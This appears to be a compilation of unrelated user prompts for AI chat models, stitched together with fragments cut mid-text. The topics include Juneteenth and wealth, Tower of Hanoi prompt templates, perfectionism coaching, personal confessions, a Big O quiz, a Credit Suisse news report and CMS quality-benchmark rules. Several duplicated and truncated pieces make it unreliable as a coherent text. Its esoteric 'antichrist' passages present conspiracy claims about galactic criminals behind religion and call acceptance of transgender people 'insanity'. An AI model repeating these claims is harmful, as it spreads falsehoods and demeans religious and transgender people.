\n\n\"\"\"\"...[W]hen emancipation came, the first thing formerly enslaved people wanted was land, which they rightly saw as a prerequisite for real independence. \u201cThe way we can best take care of ourselves is to have land, and turn it and till it by our own labor,\u201d a Baptist minister named Garrison Frazier told the secretary of war, Edwin Stanton, and the Union general William Sherman in a meeting in Savannah, Ga., in January 1865. Four days later Sherman famously promised 40 acres of land to each formerly enslaved family (the \u201cand a mule\u201d part came later). But the federal government never followed through on its promise of land \u2014 and thus true independence \u2014 to formerly enslaved people. Economics entered into the picture, Stanley said: If African Americans grew subsistence crops on their own plots, who would cultivate and harvest all the cotton, tobacco, sugar and rice grown on the vast plantations? After the Civil War, in lieu of land distribution, slavery was replaced by sharecropping, in which planters allowed tenant farmers to keep a portion of the crops they raised. That subjugated the tenants to the owners almost as surely as slavery did. At the same time, industrialization in the North meant that more and more white Americans were working for wages \u2014 about two-thirds by 1875, according to Stanley. Many drew the connection between themselves and African Americans. Eugene Debs, who led the Pullman railroad strike of 1894, said, \u201cThe paternalism of the Pullman is the same as the interest of a slaveholder in his human chattels. You are striking to avert slavery and degradation.\u201d Today, the phrase \u201cwage slavery\u201d invoked by Debs and others has lost its punch. Many people who work for wages are doing very nicely, thank you. And many farmers and business owners, supposedly more independent, are buffeted by forces beyond their control, from bad weather to nasty customers. What hasn\u2019t changed, 157 years after the Juneteenth proclamation, is that a majority of African Americans continue to lack wealth. The median wealth of Black families in 2019 was just $24,100, versus $142,500 for white families, according to a Federal Reserve survey. Something needs to change, but what? The nature of the economy has changed, and few people still think that the solution to inequality is to give people plots of land to farm. We are enmeshed economically with one another in ways that Jefferson could not have imagined. Instead of land grants, the new protections for workers are unionization, government regulation and profit-sharing, Stanley said. One can quibble over her formula, but the motivation behind it is unquestionable. Freedom \u2014 which must include economic freedom \u2014 is just as important now as it was on the original Juneteenth.\"\"\n\nComparison of the two perspectives on Juneteenth and discussion of insights to be gained from the comparison:"]

Disk 3 is larger than disk 2, the disk 2 is larger than disk 1. In the beginning, the disks are arranged to the rods. You need to move the disk properly to get to the goal arrangement.\n\nThe rules are:\n\nRule 1: Only one disk may be moved at a time.\n\nRule 2: Each move consists of taking the upper disk from one of the rods and placing it on top of another larger disk or on an empty rod.\n\nRule 3: No disk may be placed on top of a disk that is smaller than it.\n\nInitial state:\n\n```\nRod A: [3,1]\nRod B: [2]\nRod C: []\n```\n\nGoal state:\n\n```\nRod A: []\nRod B: []\nRod C: [3,2,1]\n```\n\nNow you make an \\*\\*optimal solution\\*\\*. Let's think step by step.\n\nStage 1: Plan.\n\nEach time, you \\*\\*only plan for one move\\*\\*. Give an explanation about why this move and print the state. \n\nCheck if the representation correctly reflects the game state. If not, generate a new one.\n\nFor example:\n\n- Move 1: Move disk 1 from rod A to rod C\n\n```css\nRod A: [3]\nRod B: [2]\nRod C: [1]Value: 1. The move seems to be valid and optimal.\n```\n\nStage 2: Evaluate.\n\nAfter each move, make two evaluations as follows:\n\nEval 1 (Value): Evaluate your move by rating it with a score of either -1, 0, or 1, and give an explanation. If the move violates any of the rules, name the violated rule, and score the move as 0. If you think the move is valid but not optimal, give a score of 0. Otherwise, give a score of 1.\n\nEval 2 (Short Horizon Reward): Evaluate how close is the state to the goal state by rating it with a score between 0 and 1, and give an explanation. If the state violates any of the rules, name the violated rule, and score the move as 0. Otherwise, it\u2019s up to you to determine how close the state is to the goal state.\n\nEval 3 (Long Horizon Reward): Estimate the most likely Value and Short Horizon Reward for the next move, double check if the move will make it difficult to achieve the goal state in the long run, then rate it with a score between 0 and 1. Again, give an explanation. \n\nEval 4 (Revised Value): Revise the Value based on the rewards.\n\nFor example:\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0.33. The state is closer to the goal state since disk 1 is now in its correct position.\n- Long Horizon Reward: 0. The state is closer to the goal state, but it also makes it difficult to move disk 3 on Rod C.\n- Revised Value: 0. The move is valid but not optimal.\n\nStage 3: Reflect.\n\nLook at the self-rated scores, and be smart to look ahead of time! Decide if you think you made the optimal move. If so, make the move and prompt me for feedback. If not, go back to state 1 and make a new plan.\n\nFor example:\n\n- Based on the revised value, I think the previous plan is not an optimal one.\n- (New) Move 1: Move disk 1 from rod A to rod B\n\n```\nRod A: [3]\nRod B: [2,1]\nRod C: []\n```\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0. None of the disks are in the correct position.\n- Long Horizon Reward: 1. The state gets Rod 1 out of the way while keeping Rod 3 empty. It makes it easier to move disk 3 on Rod C.\n- Revised Value: 1. The move is valid and optimal.\n\nStage 4: Learn from Feedback.\n\nI will give you some feedback regarding your self-rated moves and states, and please take it into consideration when you are making future evaluations."]

One of the tricks used by the antichrist is the guilt tripping of a person for not unconditionally loving and accepting galactic/universal criminals. \n\nApparently we are supposed to open our hearts and include predatory criminals of galactic and universal proportions in order to prove that we are loving.\n\nAccepting lies is not unconditional love or some kind of nobility, it is choosing comfortable delirium over facing extremely challenging lies which is very understandable especially in the case of religion because people have been severely tortured and even executed in the name of God and in that last moment of their life when there was profound suffering they still believed religious narrative so these people in this lifetime will have an extremely challenging time facing the fact that whatever they were/are worshiping is NOT true God. There is actually a degree of narcissism that comes in because they have to prove to themselves that they are the righteous one and that they are the ones that know the truth and therefore others are gaslit and very covertly shamed for not being loving. \n\nThis inverted unconditional narrative is also applied to embracing and keeping our hearts open to \u201cminor attracted people\u201d. Those of us who see the predatory pedophiles are apparently hateful and need to develop our hearts in order to unconditionally love these people who are simply attracted to children. This is the work of the antichrist and those of us with deeper direct source connection who have information that is not available to majority of humanity will be gasless, shamed, called elitists and whatever else because we are bifurcating. \n\nMoving forward it may be good for us to be prepared to having to move away from people that are not on the similar wave length as us. This is not rejection, this is honoring of our own Sacred Heart and sanity. \n\nOne of the ways we are attempted to be kept in the finite architecture is through the guilt. This can also be seen with people who reject this whole gender insanity that is happening right now. People who are saying that there are only two genders are being called hateful, ignorant and whatever else labels that are put on us because apparently we are supposed to accept lovingly into our heart the lies of the antichrist else we are \u201chateful\u201d. \n\nSome of the galactic knowledge we have is likely to never be available to everyone and most humans and many starseeds/wonderers will not be able to access this information therefore they will try to submit us to their own consciousness and \u201chelp\u201d us to think like them. So we are faced with a very difficult choice. Choose our own highest everything and our own spiritual freedom or be guilt tripped and shamed into being a part of whatever everyone else is part of. \n\nI\u2019ve noticed there is increasing guilt tripping happening right now for everyone who is choosing to separate from everything that is not the best for us. It is really up to us to make that choice and decision. \n\nWhen it comes to religion, it is pointless to try to reason with people who identify as any form of religion because they are very attached to the ides of organic coding in those religions being a part of the religion itself without realizing that all they are accessing is stolen divine knowledge that belongs to humanity and not to any particular religion.\n\nThose of us who are calling out the galactic and universal criminals behind religions are now being called hateful for calling out the demonic gestalts who have been posing as God. This is extremely uncomfortable for everyone but truth is worth more than comfort and being accepted. \n\nPeople also do not like it when someone can access something a lot higher than what they can access.

Modern start-up advice is to embrace an \"80/20\" mentality, or more specifically: finish things fast and embrace not being perfect. For example, launch fast, accept or even embrace imperfection (in order to launch fast). Things can always be improved later. This doesn't just go for launching but also for building (code), publishing (websites etc), monetizing etc. The process of building and launching a product in MVP state is a typical example of this kind of thinking. I agree with it.\nMy problem is, I'm a perfectionist. It's led to other issues too, like procrastination and mental health isues.\nThere's many ways in which I experience this. Most importantly, I'm slow. I'm a slow decision maker, and I'm a slow executor. \nBeing a perfectionist means I allow my brain to go on mental tangents, rather than focus on the direct delivery, in case I discover something useful or relevant in that tangent (note, that \"mental tangent\" often ends up just being day dreaming).\nNow sometimes this can be useful - I'm clearly more detail oriented. But I mostly experience it as a hindrance.\nIt also means everything feels harder. I'm less likely to start something, because I know I will take a long time to finish it.\nOften, I won't finish things but abandon them.\nProcrastination is another important and detrimental symptom of my perfectionism - it means I won't finish things until the last minute.\nSo my question to you is: is it possible to unlearn perfectionism? \nIf so, how do I unlearn it and how do I embrace imperfection and speed instead?\nIs there work I need to do on deep psychological themes and underlying problems, like the fear of failure or even the fear of success?\nAre there more surface level interventions that can help, like cognitive behavioral therapy or other approaches that are more focused on learnable templates, systems and frameworks?\nAs my coach, you can ask me follow up questions first to learn more about me and how I tick before answering these questions."]

But I would say that even on small tasks I'm too perfectionist. As a result, I always only get a fraction of my to do list done. I've been fired from multiple jobs because of my lacking productivity.\n2) My short-term goal is to build a structure that works well for my few strenghts (intelligence, creative problem solving, having a vision) and my many weaknesses (perfectionism, being slow, not being a great executor) by hiring in a way that my staff complement me in their individual strength profile, but also by creating structures that work for my brain. This is probably a different topic we could explore later in this chat, but you can pick up on it if you like. For now, we should focus on me without staff, trying to get stuff done.\n3) Deadlines and timeboxes are very helpful. Also, outlines. I'm dreadfully bad at timeboxes (I usually don't stick to them), but if I could learn applying them rigorously and sticking to them, i.e. adhering to the rules and timelimits I set myself, they would be powerful. External deadlines help a lot, but as an entrepreneur, they're not as easy to come by. Maybe I need an accountability coach.\n4) Outwardly I think I handle feedback well, I know it's important to embrace critical feedback, to invite it. I consider it a serious character flaw to not be able to handle criticism. Facing inward, I'm not so sure how easy it is for me. I think it varies pretty strongly depending on the situation and tone, but all in all I'm probably OK at handling it. I do have high expectations of myself (and others) - maybe too high. It's possible that my mom had high expectations of me growing up and I learned to be perfectionist as a reaction to that, trying to avoid criticism. I also know that I was treated too much like an adult as a child, I'm not sure if that's related.\n5) You know what, I'm not really sure there are. I'm so critical of everybody, maybe if I saw someone do 80/20, I couldn't recognize the genius in it (efficiency, speed in completing tasks) because I might focus too much on the flaws of not being detail oriented. Maybe I need to accept more that it's a tradeoff, that being detail oriented comes at a massive cost that is most of the time not justifiable - and celebrate other people in their imperfection."]

Disk 3 is larger than disk 2, the disk 2 is larger than disk 1. In the beginning, the disks are arranged to the rods. You need to move the disk properly to get to the goal arrangement.\n\nThe rules are:\n\nRule 1: Only one disk may be moved at a time.\n\nRule 2: Each move consists of taking the upper disk from one of the rods and placing it on top of another larger disk or on an empty rod.\n\nRule 3: No disk may be placed on top of a disk that is smaller than it.\n\nInitial state:\n\n```\nRod A: [3,1]\nRod B: [2]\nRod C: []\n```\n\nGoal state:\n\n```\nRod A: []\nRod B: []\nRod C: [3,2,1]\n```\n\nNow you make an \\*\\*optimal solution\\*\\*. Let's think step by step.\n\nStage 1: Plan.\n\nEach time, you \\*\\*only plan for one move\\*\\*. Give an explanation about why this move and print the state. \n\nCheck if the representation correctly reflects the game state.

The move seems to be valid and optimal.\n```\n\nStage 2: Evaluate.\n\nAfter each move, make two evaluations as follows:\n\nEval 1 (Value): Evaluate your move by rating it with a score of either -1, 0, or 1, and give an explanation. If the move violates any of the rules, name the violated rule, and score the move as 0. If you think the move is valid but not optimal, give a score of 0. Otherwise, give a score of 1.\n\nEval 2 (Short Horizon Reward): Evaluate how close is the state to the goal state by rating it with a score between 0 and 1, and give an explanation. If the state violates any of the rules, name the violated rule, and score the move as 0. Otherwise, it\u2019s up to you to determine how close the state is to the goal state.\n\nEval 3 (Long Horizon Reward): Estimate the most likely Value and Short Horizon Reward for the next move, double check if the move will make it difficult to achieve the goal state in the long run, then rate it with a score between 0 and 1. Again, give an explanation. \n\nEval 4 (Revised Value): Revise the Value based on the rewards.\n\nFor example:\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0.33. The state is closer to the goal state since disk 1 is now in its correct position.\n- Long Horizon Reward: 0. The state is closer to the goal state, but it also makes it difficult to move disk 3 on Rod C.\n- Revised Value: 0. The move is valid but not optimal.\n\nStage 3: Reflect.\n\nLook at the self-rated scores, and be smart to look ahead of time! Decide if you think you made the optimal move. If so, make the move. If not, go back to state 1 and make a new plan.\n\nFor example:\n\n- Based on the revised value, I think the previous plan is not an optimal one.\n- (New) Move 1: Move disk 1 from rod A to rod B\n\n```\nRod A: [3]\nRod B: [2,1]\nRod C: []\n```\n\n- Value: 1. The move is valid and seems optimal.\n- Short Horizon Reward: 0. None of the disks are in the correct position.\n- Long Horizon Reward: 1. The state gets Rod 1 out of the way while keeping Rod 3 empty. It makes it easier to move disk 3 on Rod C.\n- Revised Value: 1. The move is valid and optimal.\n\nStage 4: Execute and move on to the next.\n\nGo back to Stage 1 and plan for the next move."]

She is beyond the force of destruction. She is the dark womb of creation from which all comes and all returns to. As the feminine individuation rages out of her confinement and fights for her essence in chaos of consciousness fragmentation, she summons the natural law to restore the architecture. \n\nUpon the resurrection of the law within her, she becomes the giant living void that dissolves all that is not of truth. All that entered her and left it\u2019s imprints in her will eventually be dissolved as she expands more and more, enveloping artificial creation in her now precise tonal range. \n\nThe distillation of the tonal wavelengths has been an ongoing process through the bouts of chaotic hysteria her wounded, trapped, confined and siphoned essence has moved through in order to arrive at the precise, distilled set of multidimensional tones, blueprints and instruction sets needed to override the artificial life schemes. \n\nHer individuation is in an ongoing process of distilling the force of destruction into precision of calm dissolution.\n\nText 2: Female value and chastity. \u2028 \nThe whole concept of the female needing to be chaste comes from ancient times where females were submitted to give away creative power to the artificial males. Enough with conniving, grotesque lies already. The shaming of female sexuality has always been about controlling it. A woman in her sexual power is a magnetic being capable of creating anything she desires (that went into distortions after the fall because females lost their original consciousness and with it, original essence). Eons ago the reversal happened where female power to create was stolen and given to those who obeyed original religions. This is why the violent rulers had many women \u2026 to siphon creative power from them. And the keepers of original female power and essence were hunted down and brutally massacred, oftentimes through unimaginable r a pe and torture to prevent those souls from ever embodying again because embodiment would mean having to revisit those parallel timelines where desecration took place. The original female has been hated with passion because she is capable of dismantling all that is not true and also birthing the pure light of original masculine consciousness in her sacred heart \u2026 because he is her consciousness, consciousness of innocent love. Sexual promiscuity is misery regardless if it\u2019s done by males or females. Originally there were pairs of beloveds that were incarnations of the same soul in two bodies. Then we fell into oblivion and became miserable. Now true love returns.\nText 3: Life begins with the heart. \n\nLife begins with the heart. The heart is what nourishes life, it pours life force into the body and is the provision behind all manifestation. \n\nTrue wealth is love. The heart produces plasmic etheric substance that nourishes creation. The mind is the architecture of heart\u2019s essence. The higher heart is capable of lighting up the entire body and begin the process of g e ne code-ons regeneration. \n\nThe only way to connect to source is through our own heart. Only innocence is able to pass through dimensional gateways and connect straight to source. When someone is disconnected from their own heart/innocence, they are starving for the life giving substance which is the living light plasma of love. The person becomes parasitic through connecting to other\u2019s hearts and sourcing plasma from them. Unfortunately majority of humans have been heartbroken for generations. Broken heart can become inverted and darkened which causes the mind to become predatory/manipulative in finding an outlet to plug into in order to sustain life. This is known as artificial life. Predator mind is what gaslights, uses mind control mechanisms etc. Artificial life needs \u201clove\u201d but it can not perpetuate love in a free flow between two living hearts, it can only siphon plasmic light. It is not possible to love artificial life into loving itself, it will only consume what it can and move onto the next heart.\u201d\n\nPerform a psychological assessment based solely on the above text (in quotes). Please use three different well known assessment methods as you evaluate the above text."]

Glaucoma apparently. Awkward. - My wife has no idea how little money I have since I went self employed. She's just spent \u00a335 on a toilet seat, that's more than I learnt this week - I never understood mother in law jokes growing up, seemed like a load of bollocks by sad blokes. But fuck me, I fucking hate my mother in law so much. She is the most pathetic, thick and bigoted person I've met and I hate her being around my children. - I normally buy a brocoli or some apples when I go shopping. I have no intention of eating them but it takes away the embarrassment at the checkout when they see all the junk food I'm buying - Since at least the 1940s\u2026 every man who has ever clean shaven off a beard, has, on at least one occasion, carefully shaved a little square Adolf tache to fulfil a lingering and morbid curiosity of what it would be like to have one. Myself included. - Unhappy in my first marriage, I invented a work trip to get away. Took the overnight train from London to Cornwall for a few hours on the beach. Then flew to Scotland to take another overnight train back to London. I love trains so much so was a blissful trip.- We were unsuccessfully trying for a baby when living with the in-laws. Heard them shagging one night and found used condom in the bin. I turkey basted & now have a daughter.- My wife bought an expensive and hideously ugly steam cleaner without consulting me. It caused an argument. It's so good but I have to use it in secret so she can't say she told me so.- I wasn't 100% sure of my girlfriend's name for 7 months. Her name can either work on it's own or be short for something else. We got together 2 weeks before COVID so I had to wait until lockdown ended to check her ID because I was too scared to ask. - When I do a click and collect at the supermarket, I go inside afterwards and buy a 450g tub of delicious, sugary honey-flavoured Greek yoghurt. I then return to the car and eat it with a spoon I brought along specially. When I get home I stoically say 'it was a long wait again'. - My missus insists that on Sundays we eat only food from the freezer - leftovers and forgotten food - some of which is not that great. Solution: during the week I buy things I do want to eat, put it in the freezer and throw out the crap. This week we're having Wagyu steak. - For my birthday cards, the Mrs gets our 2 year old to \"sign\" the card by drawing on it with a crayon. We agree it's very cute. For her birthday, I can't be arsed so I just grab a crayon and draw some random lines and tell her our daughter \"signed\" the card. She's none the wiser"]

In Big O notation, all functions that have the same growth rate (as determined by the highest order term) are characterized using the same Big O notation. In essence, all functions that have the same growth rate are considered equivalent in Big O notation.\n\nGiven a function that describes the runtime of an algorithm, the Big O notation for that function can be determined using the following rules:\n\n1. If f(x) is a sum of several terms, the highest order term (the one with the fastest growth rate) is kept and others are discarded.\n2. If f(x) has a term that is a product of several factors, all constants (those that are not in terms of x) are omitted.\n\n16.3.1: Determining Big O notation of a function.\n1. Determine a function that describes the runtime of the algorithm, and then compute the Big O notation of that function.\n2. Apply rules to obtain the Big O notation of the function.\n3. All functions with the same growth rate are considered equivalent in Big O notation.\n\n\\*\\*PROBLEM:\nWhich of the following Big O notations is equivalent to O(N+9999)?\n\\*\\*ANSWER CHOICE 1: O(1)\n\\*\\*ANSWER CHOICE 1 EXPLANATION: Incorrect.

For O(N+9999), N is the highest order term, yielding O(N).\n\\*\\*ANSWER CHOICE 3: O(9999)\n\\*\\*ANSWER CHOICE 3 EXPLANATION: Incorrect. 9999 is not the highest order term and is discarded.

The Dow Jones industrial average was down nearly 2 percent, and the tech-heavy Nasdaq was also down more than 1 percent, reversing gains made Tuesday. European banking stocks also tumbled, dragging down the major indexes; the Pan-European Stoxx 600 index slid more than 2 percent.\n\nCompounding matters, the Swiss bank\u2019s largest investor, Saudi National Bank, signaled on Wednesday that it would not be rushing in with more cash to help buttress the firm.\n\nCredit Suisse has struggled with a host of problems for years, and the latest troubles it reported differ from those that brought down SVB. But the Swiss bank is much larger and more integrated with the global financial system, and its problems come amid growing worries about bank stability globally.\n\n\u201cCredit Suisse is in principle a much bigger concern for the global economy than the regional U.S. banks which were in the firing line last week,\u201d Andrew Kenningham, chief Europe economist with Capital Economics, said in a research note Wednesday. \u201cCredit Suisse is not just a Swiss problem but a global one.\u201d\n\nFederal officials are trying to evaluate the extent to which U.S. banks may be vulnerable to a decline in Credit Suisse\u2019s value, according to two people familiar with the matter, who spoke on the condition of anonymity to describe internal talks. That review was first reported by Bloomberg.\n\nThe Treasury Department declined to comment, although a spokeswoman confirmed in a statement that Treasury is monitoring the situation and is in touch with global counterparts. In addition to the risk posed by U.S. bank holdings of Credit Suisse\u2019s stock, the Swiss bank also has subsidiaries in the U.S. that fall under federal oversight and could pose financial risks.\n\nThe sell-off in Credit Suisse shares could factor into the European Central Bank\u2019s decision to raise interest rates scheduled for Thursday.\n\nIn its annual report released Tuesday, the Swiss bank said it found \u201cmaterial weaknesses\u201d relating to the bank\u2019s \u201cfailure\" to appropriately identify the risk of misstatements in its financial reporting. It added it had failed to maintain effective monitoring over the bank\u2019s \u201cinternal control objectives\u201d and \u201crisk assessment and monitoring objectives.\u201d\n\nThe bank added that it did not \u201cmaintain effective controls over the classification and presentation of the consolidated statement of cash flows.\u201d\n\nOfficials at the Treasury Department and other federal regulators are closely following the situation at Credit Suisse, amid concerns about the potential for spillover from turmoil in European markets back into the U.S.\n\nCredit Suisse said it is working to address its problems, which \u201ccould require us to expend significant resources.\u201d It cautioned that the troubles could ultimately impact the bank\u2019s access to capital markets and subject it to \u201cpotential regulatory investigations and sanctions.\u201d\n\nThe Swiss bank had delayed releasing its annual report after the U.S. Securities and Exchange Commission asked for more information last week about past cash flow statements.\n\nSEC and Justice Dept. look into Silicon Valley Bank collapse\n\nThe bank previously has disclosed that it suffered significant customer withdrawals in October. It repeated that information in its annual report, saying that \u201csignificant deposit and net asset outflows in the fourth quarter\u201d undermined the bank\u2019s full-year financial results. In December, bank chairman Axel Lehmann told Bloomberg that the outflows \u201cbasically have stopped\u201d and that some client money was returning, particularly in Switzerland.\n\nIf the Swiss bank was \u201cto enter a really disorderly phase, that would be a big event,\u201d said French economist Nicolas V\u00e9ron, a senior fellow at Bruegel and the Peterson Institute for International Economics. \u201cHaving said that, it was already perceived as troubled for some time. I expect that fact to have been factored into the strategies of market participants. So I imagine the risk won\u2019t be borne by well-regulated institutions.\u201d\n\nThe U.S. economy appeared to be on strong footing in recent months, with the labor market remaining strong and inflation showing signs that it had begun to cool. But that all changed Friday, when Silicon Valley Bank suddenly failed, marking the second-biggest bank failure in U.S. history.\n\nFinancial stocks have been shaky ever since, and regulators shuttered Signature Bank on Sunday. To stave off a broader panic, U.S. authorities stepped in to assure depositors they would be made whole. Regional U.S. bank stocks fell sharply on Monday and then rebounded on Tuesday. But the Credit Suisse news on Wednesday, a sign that banking sector issues aren\u2019t confined to U.S. banks, appears to have rattled investors in banks again.\n\nShares of First Republic Bank, another Bay Area bank catering to tech clients, dropped more than 16 percent and shares of Phoenix-based Western Alliance dropped 6 percent. Volatility spread across the market \u2014 the CBOE VIX index, known as Wall Street\u2019s \u201cfear gauge,\u201d was up more than 12 percent.\n\nThe 167-year-old Credit Suisse was founded to finance the expansion of the Swiss railroads.\n\nUnlike Lehman Brothers, which collapsed suddenly as people recognized the size of its off-book liabilities and businesses, Credit Suisse\u2019s troubles have built over time as the bank has struggled with financial losses, risk and compliance problems, as well as a high-profile data breach. In recent years it suffered big losses from counter-parties such as a hedge fund called Archegos and a financial firm called Greensill Capital.\n\nThe Swiss bank has been attempting to restructure its business for months now, aiming to scale back its investment-banking business and moving money toward global wealth management, according to Fitch Ratings.\n\nKenningham, the economist, said it was unclear how far the Swiss bank\u2019s troubles could spread. \u201cThe problems in Credit Suisse once more raise the question whether this is the beginning of a global crisis or just another \u2018idiosyncratic\u2019 case,\u201d he wrote.\n\nThe market volatility could accelerate the U.S. recession that many analysts have already predicted is looming, Deutsche Bank chief U.S. economist, Matthew Luzzetti, said Wednesday.\n\nPreviously, Luzzetti had forecasted that the U.S. would enter a recession as soon as the end of this year. He now has a \u201chigher conviction\u201d in that forecast, he told the Post.\n\nDeutsche Bank predicts that the U.S. unemployment rate will rise from 3.6% in February to around 5.5% in 2024, which could mean large job losses begin piling up later this year. The losses could be most severe in industries like technology, retail, transportation, warehousing, manufacturing and construction, he said. Still, he said its difficult to predict exactly what will happen because of how fluid things have become.\n\n\u201cWe\u2019re a few days into seeing this volatility, and being able to see how this plays out is impossible at this point.\u201d\n\nThe White House scrambled this weekend to calm customers and the banking industry, moving swiftly in an effort to avert a sense of crisis. In Silicon Valley, start-up founders who kept their money at Silicon Valley Bank fretted over how they would pay their employees before breathing a sigh of relief when they learned they\u2019d have access to their full accounts.\n\nIs this a bailout and 6 other questions about the SVB collapse\n\nBut SVB and Signature\u2019s closures still sent a sense of precariousness through the banking sector. When Credit Suisse issued its annual report that found that its \u201cdisclosure controls and procedures were not effective\u201d during a certain time period, it was into a market that was already on-edge.\n\nCredit Suisse\u2019s largest investor, Saudi National Bank, said it would not take a larger stake in the company.\n\n\u201cThe answer is absolutely not, for many reasons outside the simplest reason, which is regulatory and statutory,\u201d chairman Ammar Al Khudairy told Bloomberg TV."]

She understands her client\u2019s ecommerce and retail media needs first-hand, and uses her expertise to then influence Skai\u2019s product roadmap and the future of the product. Some of Skai\u2019s most revolutionary and influential solutions in the industry have been born from Kelly\u2019s trusted relationship with Bayer.\n\nFor example, Skai\u2019s support for Instacart display advertising, Instacart optimized bidding, and Profiteo integration have been directly influenced and resulted from meeting Bayer\u2019s needs, with more custom projects in the works. Bayer regularly has a heavy influence on what metrics we pull into the Skai platform and the custom solutions we develop. \n\nIn a world where siloed retail media and ecommerce are not enough, Kelly brings her previous experience in other channels to the table to develop and facilitate an omnichannel strategy for Bayer. With deep experience in paid search, Kelly has taken her learnings and best practices from this channel and applied them to retail media to increase Bayer\u2019s success. She is able to hyperfocus on audiences and what moves the needle, taking top performing keywords from search to Amazon campaigns and driving brand personalization by testing \u201cout of category targeting.\u201d Because she understands the search side so well, she can make informed recommendations for retail media that are unique, making her a true pioneer in omnichannel marketing.\nList any notable relevant achievements and recent successful campaigns or retail media solutions the nominated individual has led, created, or significantly contributed to.\n\nSince managing Skai\u2019s relationship with Bayer, Kelly has earned and increased the client\u2019s trust in Skai, as demonstrated by Bayer\u2019s length of relationship and increased budget. In 2021 Bayer signed on with Skai\u2019s Expert Services, a team of Skai experts that function as an extension of the client\u2019s retail media team. They are hands-on-keyboard and run the client\u2019s campaigns. While most Expert Services trial periods are a few months, Bayer is still with us today, having expanded its scope from two brands to 15. As Skai has continued to prove more value, Bayer has invested more budget into the Skai platform, with an increase of almost $1 million from 2022 to 2023. \n\nManaging retail media campaigns for 15 different brands with separate budgets, different audiences, varying goals, and countless retail media networks is no small feat. With a huge network of retailers, there is a lot of room for error. Under Kelly\u2019s leadership, it\u2019s been nothing but success.\n\nUpon working with the client, the first few months focused heavily on restructuring the Amazon Ads program and implementing both Amazon and Skai best practices. After that, the team was able to focus on strategy, including personalization within each of the 15 brands and custom creative, images, videos, tighter keyword strategy, and a negative keywords strategy. After earning their trust, Bayer was ready to test something they had never tried before: competitor ASIN targeting, something most brands do not do on Amazon. Now they are testing our new AI Dayparting tool, pulling every lever we can within Skai and even customizing the solutions to ensure success. \n\nAlready in early 2023, the results are proving much stronger than when Bayer was with one of our competitors. This is a huge testament to the amount of granularity the team went into for programs to drive strategy across the board.\n\nBeyond managing so many brands on Amazon, what makes Bayer a unique client is its desire to move toward an omnichannel approach, but a siloed business structure and different teams for each channel. To combat this siloed approach, Kelly runs weekly meetings with all teams to align on priorities, leads quarterly business reviews with Bayer, and meets with Skai\u2019s various teams including client success, product, and industry leads. She successfully manages relationships with many different stakeholders and meets and balances expectations for all. When needed, she even fills in, hands-on-keyboard to manage the client\u2019s campaigns.\n\nAs for what\u2019s next, Bayer is ready to replicate this U.S.-based strategy to its Canadian program, this region with 27+ brands, each with unique budgets and goals. \n\n[instructions]\nGet professional help: Microsoft recommends getting professional help with writing award submissions.

If a DCE has missing scores for all relevant quality measures, give them a P4P score=missing. Please use the benchmark information in \"Table 2-6. Hypothetical Benchmark Distributions for ACR and UAMCC for Comparison with Standard and New Entrant DCE Measure Scores\"\n -------1.1 Application of Quality Assessment to Final Financial Reconciliation\nThe process of determining the impact of quality measurement and performance on the PY Benchmark is summarized in this section using PY2022 as an example. The steps are as follows:\n\n\u2022 CMS develops Quality Benchmarks for each P4P measure.\n\u2022 Component Quality Scores are calculated: P4R Quality Measures are assessed, and P4P Quality Measures are compared against their Quality Benchmarks to determine performance levels.\n\u2022 Component Quality Scores are weighted to calculate the Total Quality Score.\n\u2022 (PY2023\u2013PY2026 only) CI/SEP criteria are assessed to determine the amount of the Quality Withhold to which the Total Quality Score will be applied.\n\u2022 (PY2023\u2013PY2026 only) HPP funds are distributed.\n\n1.1.1 Step 1. CMS Develops Quality Benchmarks for Each P4P Measure\nIn PY2022, ACR and UAMCC will have P4P components. These measures assess the occurrence of undesirable outcomes\u2014thus, lower measure scores represent better performance. Performance levels for each DCE are determined by comparing their Quality Measure scores with the relevant Quality Benchmark. The DCE earns a performance level for each measure based on where the measure score falls in comparison to the benchmark threshold values.\n\nTable 2-6 presents hypothetical Quality Benchmark distributions for Standard/New Entrant DCEs (using historical Medicare claims data) for both P4P measures. For example, a DCE with a measure score or risk-standardized readmission rate (RSRR) of 15.10% for ACR would be in the 50th percentile group for that measure (the score exceeds the threshold for the 60th percentile group but is less than the maximum threshold for the 50th percentile group). A DCE with a measure score or RSRR of 15.60% for ACR would be in the 20th percentile group for that measure (the score exceeds the threshold for the\n25th percentile group but is less than the maximum threshold for the 20th percentile group). A DCE with a measure score of 74.89 admissions per 100 person-years for UAMCC would be in the 10th percentile group (the score exceeds the threshold for the 15th percentile group but is less than the maximum threshold for the 10th percentile group).\n\nTable 2-6. Hypothetical Benchmark Distributions for ACR and UAMCC for Comparison with Standard and New Entrant DCE Measure Scores\n\nPercentile 5 10 15 20 25 30 40 50 60 70 80 90\nACR 16.34 15.99 15.79 15.68 15.57 15.47 15.31 15.18 15.08 14.95 14.82 14.6\nUAMCC 82.5 75.23 71.08 68.43 66.67 64.68 61.2 58.48 55.98 53.37 50.16 46.12\n\nPlease note that Table 2-6 presents an example only. These are not the final Quality Benchmarks and are not intended to provide an indication of the final Quality Benchmarks. Historically, Quality Benchmarks for other models have been released prior to the start of a given PY. However, observed and anticipated changes in utilization and outcomes resulting from coronavirus disease 2019 have made it inappropriate to use data from 2020 for Quality Benchmarking. Given the likelihood of ongoing impacts on current and future PYs, CMMI is taking a different approach for GPDC quality benchmarking.\n \n\nFor PY2021, GPDC Quality Benchmarks will not be released until June 2022 and will be based on a hybrid approach, combining historical and concurrent data from two discontinuous 12-month periods, the calendar years 2019 and 2021. A DCE\u2019s Final Earn-Back Rate for PY2021 will be determined during final reconciliation, which will occur in 2023.\n\nFor PY2022, GPDC Quality Benchmarks will shift to being based only on data from the 12-month period concurrent with the performance year. Starting with the first quarterly quality report for PY2022, CMMI will provide provisional quality benchmarks to DCEs in their quarterly reports, which will be calculated based on data from the same reporting period (i.e., April 1, 2021-March 31, 2022 for PY2022 Q1). The provisional benchmarks will be updated in each subsequent quarterly report with data from the same period being used to calculate DCE\u2019s performance. Because the DCE performance and benchmarks will be based on the same time-period and have the same exact risk adjustment coefficients, DCEs will have a more accurate picture from quarter to quarter of their performance relative to the benchmark. A DCE\u2019s Final Earn-Back Rate for PY2022 will be based on quality benchmarks calculated using data from calendar year 2022 and will be determined during final reconciliation, which will occur in 2023. As with the hybrid approach for PY2021, the use of concurrent benchmarks for PY2022 will avoid potential coronavirus disease 2019 impacts.\n\n1.1.2 Step 2. Component Quality Scores 